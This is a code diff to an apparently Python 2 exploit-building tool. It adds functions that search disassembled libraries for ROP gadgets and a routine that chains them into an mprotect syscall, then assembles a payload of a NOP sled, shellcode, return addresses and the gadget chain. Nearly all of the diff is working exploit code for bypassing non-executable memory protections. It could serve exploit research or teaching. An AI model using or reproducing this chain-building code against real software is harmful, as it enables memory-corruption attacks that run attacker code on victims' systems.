@@ -313,13 +313,224 @@ def pack_value(value):
 
 def find_gadget_addr(lib_list, func):
     
-    offset = None
+    offset = 0
     for entry in lib_list:
         offset = func(entry[0])
-        if offset != None:
+        if offset != 0:
             return (entry[1] + offset)
 
     print 'Unable to find gadget address for %s !' %(func)
+    return 0
+
+def gfind_pop_edx(gadgetMap):
+    for gadget_addr in gadgetMap:
+        instr_list = gadgetMap[gadget_addr]
+        ilist = []
+        for instr in instr_list:
+            ilist.append([instr.mnemonic, instr.op_str])
+
+        if ilist == [["pop", "edx"], ["ret"]]:
+            return gadget_addr
+        if ilist == [["mov", "edx, dword ptr [esp]"], ["add", "esp, 4"], ["ret"]]:
+            return gadget_addr
+
+    print "gfind_pop_edx - 0"
+    return 0
+
+def gfind_inc_edx(gadgetMap):
+    for gadget_addr in gadgetMap:
+        instr_list = gadgetMap[gadget_addr]
+        ilist = []
+        for instr in instr_list:
+            ilist.append([instr.mnemonic, instr.op_str])
+
+        if ilist == [["inc", "edx"], ["ret"]]:
+            return gadget_addr
+        if ilist == [["add", "edx, 1"], ["ret"]]:
+            return gadget_addr
+        if ilist == [["sub", "edx, 0xffffffff"], ["ret"]]:
+            return gadget_addr
+    print "gfind_inc_edx - 0"
+    return 0
+
+def gfind_pop_ebx(gadgetMap):
+    for gadget_addr in gadgetMap:
+        instr_list = gadgetMap[gadget_addr]
+        ilist = []
+        for instr in instr_list:
+            ilist.append([instr.mnemonic, instr.op_str])
+
+        if ilist == [["pop", "ebx"], ["ret"]]:
+            return gadget_addr
+        if ilist == [["mov", "ebx, dword ptr [esp]"], ["add", "esp, 4"], ["ret"]]:
+            return gadget_addr
+
+    print "gfind_pop_ebx - 0"
+    return 0
+
+def gfind_dec_ebx(gadgetMap):
+    for gadget_addr in gadgetMap:
+        instr_list = gadgetMap[gadget_addr]
+        ilist = []
+        for instr in instr_list:
+            ilist.append([instr.mnemonic, instr.op_str])
+
+        if ilist == [["dec", "ebx"], ["ret"]]:
+            return gadget_addr
+        if ilist == [["sub", "ebx, 1"], ["ret"]]:
+            return gadget_addr
+        if ilist == [["add", "ebx, 0xffffffff"], ["ret"]]:
+            return gadget_addr
+    print "gfind_dec_ebx - 0"
+    return 0
+
+def gfind_pop_esi(gadgetMap):
+    for gadget_addr in gadgetMap:
+        instr_list = gadgetMap[gadget_addr]
+        ilist = []
+        for instr in instr_list:
+            ilist.append([instr.mnemonic, instr.op_str])
+
+        if ilist == [["pop", "esi"], ["ret"]]:
+            return gadget_addr
+        if ilist == [["mov", "esi, dword ptr [esp]"], ["add", "esp, 4"], ["ret"]]:
+            return gadget_addr
+
+    print "gfind_pop_esi - 0"
+    return 0
+
+def gfind_inc_esi(gadgetMap):
+    for gadget_addr in gadgetMap:
+        instr_list = gadgetMap[gadget_addr]
+        ilist = []
+        for instr in instr_list:
+            ilist.append([instr.mnemonic, instr.op_str])
+
+        if ilist == [["inc", "esi"], ["ret"]]:
+            return gadget_addr
+        if ilist == [["inc", "esi"], ["add", "al, 0x83"], ["ret"]]:
+            return gadget_addr
+        if ilist == [["add", "esi, 1"], ["ret"]]:
+            return gadget_addr
+        if ilist == [["sub", "esi, 0xffffffff"], ["ret"]]:
+            return gadget_addr
+    print "gfind_inc_esi - 0"
+    return 0
+
+def build_rop_chain_syscall_generic(lib_list):
+    minus_one = 0xffffffff
+    dummy_gadget = 0x11111111
+    rop_payload = ""
+
+    generic_gadget_list = []
+
+    #Get 7 in edx
+
+    gadget1 = find_gadget_addr(lib_list, gfind_pop_edx)
+
+    generic_gadget_list.append(gadget1)
+
+    generic_gadget_list.append(minus_one)
+
+    gadget2 = find_gadget_addr(lib_list, gfind_inc_edx)
+
+    i = 0
+    while i < 8:
+        generic_gadget_list.append(gadget2)
+        i += 1
+
+    #Get aligned memory address in ebx
+    gadget3 = find_gadget_addr(lib_list, gfind_pop_ebx)
+
+    generic_gadget_list.append(gadget3)
+
+    aligned_memory_address = ((buf_address >> 12) << 12) + 1
+    generic_gadget_list.append(aligned_memory_address)
+
+    gadget4 = find_gadget_addr(lib_list, gfind_dec_ebx)
+
+    generic_gadget_list.append(gadget4)
+
+    #Length in esi
+    gadget5 = find_gadget_addr(lib_list, gfind_pop_esi)
+
+    generic_gadget_list.append(gadget5)
+
+    generic_gadget_list.append(minus_one)
+
+    gadget6 = find_gadget_addr(lib_list, gfind_inc_esi)
+
+    i = 0
+    while i < 2:
+        generic_gadget_list.append(gadget6)
+        i += 1
+
+    gadget7 = find_gadget_addr(lib_list, gfind_double_esi)
+
+    i = 0
+    while i < 12:
+        generic_gadget_list.append(gadget7)
+        i += 1
+
+    gadget8 = find_gadget_addr(lib_list, gfind_mov_eax_esi)
+
+    generic_gadget_list.append(gadget8)
+
+    gadget9 = find_gadget_addr(lib_list, gfind_mov_ecx_eax)
+
+    generic_gadget_list.append(gadget9)
+
+    #mprotect syscall number 0x7d in eax
+
+    generic_gadget_list.append(gadget5)
+
+    generic_gadget_list.append(minus_one)
+
+    i = 0
+    while i < 2:
+        generic_gadget_list.append(gadget6)
+        i += 1
+
+    i = 0
+    while i < 7:
+        generic_gadget_list.append(gadget7)
+        i += 1
+
+    gadget10 = find_gadget_addr(lib_list, gfind_dec_esi)
+
+    i = 0
+    while i < 3:
+        generic_gadget_list.append(gadget10)
+        i += 1
+
+    generic_gadget_list.append(gadget8)
+
+    #syscall
+    gadget11 = find_gadget_addr(lib_list, gfind_syscall)
+    for entry in lib_list:
+        gadget11 = gfind_syscall(entry)
+        if gadget11 != 0:
+            gadget11 += entry[1]
+            break
+
+    generic_gadget_list.append(gadget11)
+
+    generic_gadget_list.append(buf_address)
+
+    ret_addr = "\xff\xff\xff\xff"
+    i = 0
+    for gadget_address in generic_gadget_list:
+        rop_payload += pack_value(gadget_address)
+        if i == 0:
+            ret_addr = rop_payload
+        i += 1
+
+    nop_len = buf_len + 8 - len(packed_shellcode) - (len(ret_addr) * 10)
+    nop_sled = "\x90" * nop_len
+
+    rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload
+
+    print_rop_payload(rop_payload)
 
 def build_rop_chain_libc_syscalls(lib_list):
 
